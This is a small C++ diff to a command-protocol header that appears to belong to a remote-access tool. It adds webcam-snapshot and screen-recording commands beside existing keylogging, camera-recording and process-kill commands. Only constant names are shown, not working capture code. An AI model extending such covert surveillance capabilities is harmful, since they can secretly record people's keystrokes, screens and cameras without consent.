@@ -34,7 +34,9 @@ namespace Protocol {
         static constexpr const char* PROC_KILL = "STOPPROC";
 
         static constexpr const char* CAM_RECORD = "cam_record";
+        static constexpr const char* CAMSHOT = "CAMSHOT";
         static constexpr const char* SCREENSHOT = "SCRSHOT";
+        static constexpr const char* SCR_RECORD = "SCR_RECORD";
         static constexpr const char* START_KEYLOG = "STARTKLOG";
         static constexpr const char* STOP_KEYLOG = "STOPKLOG";
 
@@ -74,7 +76,9 @@ namespace Protocol {
             TYPE::PROC_START,
             TYPE::PROC_KILL,
             TYPE::CAM_RECORD,
+            TYPE::CAMSHOT,
             TYPE::SCREENSHOT,
+            TYPE::SCR_RECORD,
             TYPE::START_KEYLOG,
             TYPE::STOP_KEYLOG,
 
